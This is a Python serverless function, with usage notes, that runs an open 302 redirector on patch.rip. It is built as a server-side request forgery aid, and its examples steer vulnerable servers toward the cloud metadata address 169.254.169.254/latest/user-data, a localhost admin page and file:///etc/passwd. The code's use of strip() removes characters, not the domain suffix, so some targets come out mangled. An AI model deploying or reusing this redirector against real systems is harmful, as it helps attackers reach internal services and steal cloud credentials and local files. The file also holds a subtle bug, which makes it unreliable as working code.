import io
import json
import logging
from urllib.parse import urlparse

from fdk import response

usage="""
Simple 302 Location redirector that redirects to the netloc part with some tricks:

    curl -I https://redirect_me__dev___etc___passwd.patch.rip/t/302/http


    HTTP/2 302 
    date: Wed, 05 Oct 2022 11:26:41 GMT
    content-type: text/plain
    content-length: 33
    location: https://redirect_me.dev/etc/passwd
    fn-call-id: 01GEKY95TJNG8G010ZJ000001K
    x-served-by: redirect_me__dev___etc___passwd.patch.rip
    cf-cache-status: DYNAMIC
    report-to: {"endpoints":[{"url":"https:\/\/a.nel.cloudflare.com\/report\/v3?s=kSsgESvJJWwWoAuAW%2BAac6Z8JA1T9m26ucscfUbc5vAmwU7UU34oSQmmgQC0OBUttwJF1g9PTMRYd9ROZaN8%2F8Vyw3VOwhNP0nNYoc0adaHFgE88UCg6vPT0YAjrZYDYM7YQy05Rqwz23FxpwFdYQPFS0ca6MebVBTo7IQ%3D%3D"}],"group":"cf-nel","max_age":604800}
    nel: {"success_fraction":0,"report_to":"cf-nel","max_age":604800}
    server: cloudflare
    cf-ray: 7555cdbd289d3762-MXP
    alt-svc: h3=":443"; ma=86400, h3-29=":443"; ma=86400


Following replacements take place:

redirect = redirect.replace('___', '/')
redirect = redirect.replace('__', '.')

If you want to redirect to plain http:// start with prepend 
Finally, starting with ___ will use file:// as handler

Examples:
http(s)://_169__254__169__254___latest___user-data.patch.rip/t/302/http
http(s)://_localhost___manager___html.patch.rip/t/302/http
http(s)://___etc___passwd.patch.rip/t/302/http


"""

def handler(ctx, data: io.BytesIO = None):
    parse = urlparse(ctx.RequestURL())
    if parse.netloc == 'patch.rip':
        return response.Response(ctx, response_data=usage, status_code=200)
    redirect = parse.netloc.strip('.patch.rip')
    if redirect.startswith('___'):
        redirect=f'file://{redirect[0:]}'
    elif redirect.startswith('_'):
        redirect=f'http://{redirect[1:]}'
    else:
        redirect=f'https://{redirect[0:]}'
    redirect = redirect.replace('___', '/')
    redirect = redirect.replace('__', '.')
    ctx.SetResponseHeaders({"Location": redirect}, 302)
    return response.Response(ctx, response_data=redirect, status_code=302)
